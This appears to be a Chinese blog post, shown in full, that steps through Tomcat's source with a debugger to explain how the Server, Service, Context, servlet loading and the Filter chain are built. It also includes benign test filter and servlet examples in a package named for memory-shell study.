<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Server <span class="title function_">getServer</span><span class="params">()</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (server != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> server;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    System.setProperty(<span class="string">&quot;catalina.useNaming&quot;</span>, <span class="string">&quot;false&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    server = <span class="keyword">new</span> <span class="title class_">StandardServer</span>();  </span><br><span class="line">  </span><br><span class="line">    initBaseDir();  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Set configuration source  </span></span><br><span class="line">    ConfigFileLoader.setSource(<span class="keyword">new</span> <span class="title class_">CatalinaBaseConfigurationSource</span>(<span class="keyword">new</span> <span class="title class_">File</span>(basedir), <span class="literal">null</span>));  </span><br><span class="line">  </span><br><span class="line">    server.setPort( -<span class="number">1</span> );  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Service</span> <span class="variable">service</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardService</span>();  </span><br><span class="line">    service.setName(<span class="string">&quot;Tomcat&quot;</span>);  </span><br><span class="line">    server.addService(service);  </span><br><span class="line">    <span class="keyword">return</span> server;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以最终是<code>getServer</code>方法创建了一个<code>StandardServer</code>, 并实例化一个<code>StandardService</code>添加到创建的<code>StandardServer</code>中</p>
<p>之后创建一个连接器, 添加给service,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722160530.png" alt="image.png"><br>也就是说是<code>tomcat.getConnector();</code>这句创建了&#x3D;&#x3D;Server&#x3D;&#x3D;和&#x3D;&#x3D;service&#x3D;&#x3D;以及service中的&#x3D;&#x3D;连接器&#x3D;&#x3D;</p>
<p>继续看下一句</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> tomcat.addWebapp(<span class="string">&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;.&quot;</span>).getAbsolutePath());</span><br></pre></td></tr></table></figure>

<p>断点进到<code>addWebapp</code>中去<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722163236.png" alt="image.png"></p>
<p>可以跟进<code>getHost</code>方法, 这里和之前的逻辑一样, 有则返回, 无则创建</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Host <span class="title function_">getHost</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">Engine</span> <span class="variable">engine</span> <span class="operator">=</span> getEngine();  </span><br><span class="line">    <span class="keyword">if</span> (engine.findChildren().length &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> (Host) engine.findChildren()[<span class="number">0</span>];  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Host</span> <span class="variable">host</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardHost</span>();  </span><br><span class="line">    host.setName(hostname);  </span><br><span class="line">    getEngine().addChild(host);  </span><br><span class="line">    <span class="keyword">return</span> host;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显这里是创建了<code>engine</code>并为其创建了一个<code>host</code>, 这个host默认绑定在<code>localhost</code>, 并将该host作为<code>engine</code>的child, 这也就是组合模式的运用</p>
<p>跟进addWebapp<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722164542.png" alt="image.png"><br>创建了一个<code>LifecycleListener</code>, 是一个空的ContextConfig<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722165419.png" alt="image.png"></p>
<p>再跟进addWebapp<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722171149.png" alt="image.png"></p>
<p>为host创建了一个context, 并配置了该context的默认监听器 (观察者)<br>在此时候context也就创建好了</p>
<p>之后看</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tomcat.addServlet(context, <span class="string">&quot;helloServlet&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloServlet</span>());  </span><br><span class="line">context.addServletMappingDecoded(<span class="string">&quot;/hello&quot;</span>, <span class="string">&quot;helloServlet&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>首先是<code>addServlet</code>为现有的context创建了一个wrapper<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722171955.png" alt="image.png"></p>
<p>addServletMappingDecoded 添加了映射<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722172913.png" alt="image.png"></p>
<p>到这里该创建的都创建了<br>之后就会进入到init和start的流程, 和上面的泳道图中的流程基本一致</p>
<p>有一点不同在于下图中的过程<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722223729.png" alt="image.png"></p>
<p>在调试时发现这里应该是先执行&#x3D;&#x3D;<code>DefaultWebXmlListener</code>&#x3D;&#x3D;监听器<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722230011.png" alt="image.png"></p>
<p>这个监听器是<code>org.apache.catalina.startup.Tomcat</code>里定义的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722230133.png" alt="image.png"><br>看注释可以知道这个监听器是用来代替传统启动方式的<code>$CATALINA_HOME/conf/web.xml</code>配置启动的, 这样就相当于它代替了<code>org.apache.catalina.startup.ContextConfig</code>这个监听器的任务, 再来看<code>ContextConfig</code>监听器, 它的<code>defaultWebXml</code>被赋值为了<code>org/apache/catalina/startup/NO_DEFAULT_XML</code>(即不采用默认xml配置文件) 也证实了这一点</p>
<p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722230643.png" alt="image.png"></p>
<p>跟进<code>DefaultWebXmlListener</code>监听器<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722231231.png" alt="image.png"><br>addServlet创建servlet对应的wrapper后, 将其添加到context<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722231304.png" alt="image.png"></p>
<p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722232232.png" alt="image.png"></p>
<p>最后会启动这个wrapper<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722232056.png" alt="image.png"></p>
<p>再看ContextConfig监听器<br>可以在此处打条件断点进去<br><code>listener.getClass().getName().equals(&quot;org.apache.catalina.startup.ContextConfig&quot;)</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722235322.png" alt="image.png"></p>
<p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722235356.png" alt="image.png"><br>如果是传统的配置文件启动, 会进入<code>configureStart();</code>, 这里并不是就不会进去. </p>
<h3 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h3><h4 id="servlet初始化流程分析"><a href="#servlet初始化流程分析" class="headerlink" title="servlet初始化流程分析"></a>servlet初始化流程分析</h4><p>断点打在<code>org.apache.catalina.core.StandardWrapper#setServletClass</code></p>
<p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723002635.png" alt="image.png"></p>
<p>根据上面的调试StandardWrapper#setServletClass的上层调用有两种情况<br>一种是<code>DefaultWebXmlListener</code> , 一种是<code>ContextConfig</code><br>先来看<code>DefaultWebXmlListener</code><br>它会触发到<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722231304.png" alt="image.png"></p>
<p>这里可以看见关键的三步</p>
<ul>
<li><p>&#x3D;&#x3D;创建servlet&#x3D;&#x3D;(<code>addServlet</code>)</p>
</li>
<li><p>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值</p>
</li>
<li><p>将<code>url</code>和<code>servlet</code>类做映射<br>再看创建Servlet的逻辑<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722232232.png" alt="image.png"><br>创建Servlet又分为</p>
</li>
<li><p>创建<code>Wapper</code>对象</p>
</li>
<li><p>设置<code>Wapper</code>中<code>Servlet</code>的<code>class</code></p>
</li>
<li><p>设置<code>Wapper</code>中<code>Servlet</code>的名称</p>
</li>
<li><p>将配置好的<code>Wrapper</code>添加到<code>Context</code>中<br>因此初始化Servlet分为</p>
</li>
<li><p>创建<code>Wapper</code>对象</p>
</li>
<li><p>设置<code>Wapper</code>中<code>Servlet</code>的<code>class</code></p>
</li>
<li><p>设置<code>Wapper</code>中<code>Servlet</code>的名称</p>
</li>
<li><p>将配置好的<code>Wrapper</code>添加到<code>Context</code>中</p>
</li>
<li><p>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值</p>
</li>
<li><p>将<code>url</code>和<code>servlet</code>类做映射</p>
</li>
</ul>
<p><strong>再来看<code>ContextConfig</code></strong><br>在configureContext方法中同样会调用到<code>wrapper.setServletClass(servlet.getServletClass());</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;  </span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();  </span><br><span class="line">    <span class="comment">// Description is ignored  </span></span><br><span class="line">    <span class="comment">// Display name is ignored    // Icons are ignored  </span></span><br><span class="line">    <span class="comment">// jsp-file gets passed to the JSP Servlet as an init-param  </span></span><br><span class="line">    <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;  </span><br><span class="line">        wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;  </span><br><span class="line">        wrapper.setEnabled(servlet.getEnabled().booleanValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">    wrapper.setName(servlet.getServletName());  </span><br><span class="line">    Map&lt;String,String&gt; params = servlet.getParameterMap();  </span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;  </span><br><span class="line">        wrapper.addInitParameter(entry.getKey(), entry.getValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">    wrapper.setRunAs(servlet.getRunAs());  </span><br><span class="line">    Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();  </span><br><span class="line">    <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;  </span><br><span class="line">        wrapper.addSecurityReference(  </span><br><span class="line">                roleRef.getName(), roleRef.getLink());  </span><br><span class="line">    &#125;  </span><br><span class="line">    wrapper.setServletClass(servlet.getServletClass());  </span><br><span class="line">    <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();  </span><br><span class="line">    <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="type">long</span> <span class="variable">maxFileSize</span> <span class="operator">=</span> -<span class="number">1</span>;  </span><br><span class="line">        <span class="type">long</span> <span class="variable">maxRequestSize</span> <span class="operator">=</span> -<span class="number">1</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">fileSizeThreshold</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxFileSize()) &#123;  </span><br><span class="line">            maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxRequestSize()) &#123;  </span><br><span class="line">            maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getFileSizeThreshold()) &#123;  </span><br><span class="line">            fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(  </span><br><span class="line">                multipartdef.getLocation(),  </span><br><span class="line">                maxFileSize,  </span><br><span class="line">                maxRequestSize,  </span><br><span class="line">                fileSizeThreshold));  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;  </span><br><span class="line">        wrapper.setAsyncSupported(  </span><br><span class="line">                servlet.getAsyncSupported().booleanValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">    wrapper.setOverridable(servlet.isOverridable());  </span><br><span class="line">    context.addChild(wrapper);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">for</span> (Entry&lt;String, String&gt; entry :  </span><br><span class="line">        webxml.getServletMappings().entrySet()) &#123;  </span><br><span class="line">    context.addServletMappingDecoded(entry.getKey(), entry.getValue());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也是完成了上面6个步骤</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">...</span><br><span class="line">wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">...</span><br><span class="line">wrapper.setName(servlet.getServletName());</span><br><span class="line">...</span><br><span class="line">wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">...</span><br><span class="line">context.addChild(wrapper);</span><br><span class="line">...</span><br><span class="line">context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h4 id="servlet装载流程分析"><a href="#servlet装载流程分析" class="headerlink" title="servlet装载流程分析"></a>servlet装载流程分析</h4><p>断点在<code>org.apache.catalina.core.StandardWrapper#loadServlet</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723154556.png" alt="image.png"><br>寻找其上层调用<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723155407.png" alt="image.png"><br>这里注释写的是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// Load and initialize all &quot;load on startup&quot; servlets</span><br></pre></td></tr></table></figure>
<p>说明是启动所有标记为<code>LoadOnStartUp</code>d的servlet</p>
<p>并且在此之前执行了<br><code>listenerStart()</code> 和 <code>filterStart()</code> 启动listener和filter<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723155708.png" alt="image.png"></p>
<p>再看loadOnStartup方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loadOnStartup</span><span class="params">(Container children[])</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Collect &quot;load on startup&quot; servlets that need to be initialized  </span></span><br><span class="line">    TreeMap&lt;Integer,ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();  </span><br><span class="line">    <span class="keyword">for</span> (Container child : children) &#123;  </span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) child;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">loadOnStartup</span> <span class="operator">=</span> wrapper.getLoadOnStartup();  </span><br><span class="line">        <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">            <span class="keyword">continue</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> Integer.valueOf(loadOnStartup);  </span><br><span class="line">        map.computeIfAbsent(key, k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()).add(wrapper);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Load the collected &quot;load on startup&quot; servlets  </span></span><br><span class="line">    <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (Wrapper wrapper : list) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                wrapper.load();  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (ServletException e) &#123;  </span><br><span class="line">                getLogger().error(  </span><br><span class="line">                        sm.getString(<span class="string">&quot;standardContext.loadOnStartup.loadException&quot;</span>, getName(), wrapper.getName()),  </span><br><span class="line">                        StandardWrapper.getRootCause(e));  </span><br><span class="line">                <span class="comment">// <span class="doctag">NOTE:</span> load errors (including a servlet that throws  </span></span><br><span class="line">                <span class="comment">// UnavailableException from the init() method) are NOT                </span></span><br><span class="line">                <span class="comment">// fatal to application startup                </span></span><br><span class="line">                <span class="comment">// unless failCtxIfServletStartFails=&quot;true&quot; is specified</span></span><br><span class="line">                <span class="keyword">if</span> (getComputedFailCtxIfServletStartFails()) &#123;  </span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>loadOnStartup</code> &lt; 0 就不加载(只有访问到时才加载)<br>将loadOnStartup &gt;&#x3D; 0 的创建一个treeMap, treeMap的键为loadOnStartup的值, reeMap的值 为ArrayList, 里面存储需要加载的Wrapper(Servlet)<br>之后遍历整个treeMap加载</p>
<h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723214431.png" alt="image.png"></p>
<h4 id="tomcat源码调试"><a href="#tomcat源码调试" class="headerlink" title="tomcat源码调试"></a>tomcat源码调试</h4><p>这里使用传统方式启动tomcat而不是嵌入式,<br>要调试这个非嵌入式的tomcat, 网上很多教程都很繁琐且不太靠谱,<br>可以直接添加嵌入式tomcat的源码来调试, 版本保持一致即可</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.107<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>TestFilter.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.MemShell;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebFilter(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filter init&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filter doFilter &quot;</span>);  </span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filter destroy&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>TestServlet.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.MemShell;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>tomcat会自动扫描到并加载我们编写的filter<br>断点打在编写的doFilter方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723201259.png" alt="image.png"></p>
<h4 id="请求如何到达Filter"><a href="#请求如何到达Filter" class="headerlink" title="请求如何到达Filter"></a>请求如何到达Filter</h4><p>具体调试过程就不记录了<br>总之调试加阅读tomcat架构原理可以理出以下逻辑<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724003839.png" alt="image.png"><br>Wrapper的最后一个Valve也就是StandardWrapperValve会创建一个Filter链并进行调用</p>
<h4 id="Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain"><a href="#Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain" class="headerlink" title="Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain"></a>Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain</h4><p>&#x3D;&#x3D;&#x3D;<code>FilterDef</code>&#x3D;&#x3D;是过滤器的抽象定义，存放这些<code>FilterDef</code>的数组被称为<code>FilterDefs</code>，每个<code>FilterDef</code>定义了一个具体的过滤器，包括描述信息、名称、过滤器实例以及<code>class</code>等，这一点可以从<code>org/apache/tomcat/util/descriptor/web/FilterDef.java</code>的代码中看出来；</p>
<p>&#x3D;&#x3D;<code>FilterConfigs</code>&#x3D;&#x3D;, <code>FilterDefs</code>只是过滤器的抽象定义，而<code>FilterConfigs</code>则是这些过滤器的具体配置实例，我们可以为每个过滤器定义具体的配置参数，以满足系统的需求；</p>
<p>&#x3D;&#x3D;<code>FilterMaps</code>&#x3D;&#x3D;，它是用于将<code>FilterConfigs</code>映射到具体的请求路径或其他标识上，这样系统在处理请求时就能够根据请求的路径或标识找到对应的<code>FilterConfigs</code>，从而确定要执行的过滤器链；</p>
<p>&#x3D;&#x3D;<code>FilterChain</code>&#x3D;&#x3D;是由多个<code>FilterConfigs</code>组成的链式结构，它定义了过滤器的执行顺序，在处理请求时系统会按照<code>FilterChain</code>中的顺序依次执行每个过滤器，对请求进行过滤和处理。</p>
